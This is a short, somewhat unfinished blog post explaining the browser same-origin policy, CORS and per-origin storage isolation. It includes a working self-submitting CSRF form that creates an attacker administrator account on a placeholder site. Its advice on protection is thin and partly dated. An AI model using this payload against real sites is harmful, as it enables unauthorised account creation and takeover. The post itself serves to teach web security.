---
layout: blog-post
title: "Same origin policy and CORS"
excerpt: "Same origin policy and CORS"
disqus_id: /2021/02/20/same-origin-policy-and-cors/
tags:
    - Web Security
---


I have been recently focussed a lot on Web application security especially web vulnerabilities such as [Cross Site Scripting (XSS)]() and [Cross Site Request Forgery (CSRF)]()

One of the interesteing protection mechanism around these attacks is [Same Origin Policy]() which I believe every application developer should understand in deep.

### So what is cross origin policy?

Reference: [Mozilla docs](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)


When a browser loads the web page, the web page elements might refer to other origins (basically the combination of protocol, host and port). These elements can be CSS links `<link href>`, JS links `<script src>`, `<img>` tags,

### What is not covered under same origin policy?

This is most important. Its very important for developers to understand what is excluded under same origin policy because that's where the web application becomes vulnerable.

1) cross domain form posting is perfectly acceptable in web applciation. i.e. a form loaded at http://localhost:8080  , can execute the following code without any issues:

```html
<html>
    <body onload='document.getElementById("csrfform").submit()'>
        <form method='post' id='csrfform' action='http://somesite.com/ve/admin/users/add'>
            <input type='hidden' name='token' value =''/>
            <input type='hidden' name='real_name' value ='attacker'/>
            <input type='hidden' name='bio' value ='test'/>
            <input type='hidden' name='status' value ='active'/>
            <input type='hidden' name='role' value ='administrator'/>
            <input type='hidden' name='username' value ='evilattacker2'/>
            <input type='hidden' name='password' value ='pwnd1111'/>
            <input type='hidden' name='email' value ='ahuja.madhur@gmail.com'/>
            <input type='submit' value ='submit'/>
        </form>
    </body>
</html>
```

The above is a classic case of CSRF attack where a forged page is tricking the user to submit a request to other site without his knowledge. If the user is already logged onto http://somesite.com , the browser would also automatically include the cookies appropriate for http://somesite.com to automatically authenticate the request.

2) The script tags do not come under same origin policty. i.e. it is perfectly legal for a site at http://somesite.com to have the following script tag in its html

```html
<html>
    <head>
        <script src="http://somesite.com/somejs.com">
    </head>
    <body>
    </body>
<html>
```

3) The `<img>` tag is allowed to retireve images from the cross origin. This might seem very innocuous but there have been some [attacks](https://www.evonide.com/side-channel-attacking-browsers-through-css3-features/) because of this.

4)


### Web Storage, IndexedDB and LocalStorage

Each origin gets its own dedicated Web Storage, IndexedDb and LocalStorage. The site in one origin cannot access the storage data of other origin. For example, the site running at http://localhost:8081 cannot access the localstorage of http://localhost:8082



### How to circumvent Same origin policy?

The [Cross origin request sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) specification permits the cross origin sharing under special circumstances.


## Protections against these attacks

The protection against these attacks is really a big topic. But primarily two headers are helpful:

* content-security-policy
* X-XSS-Protection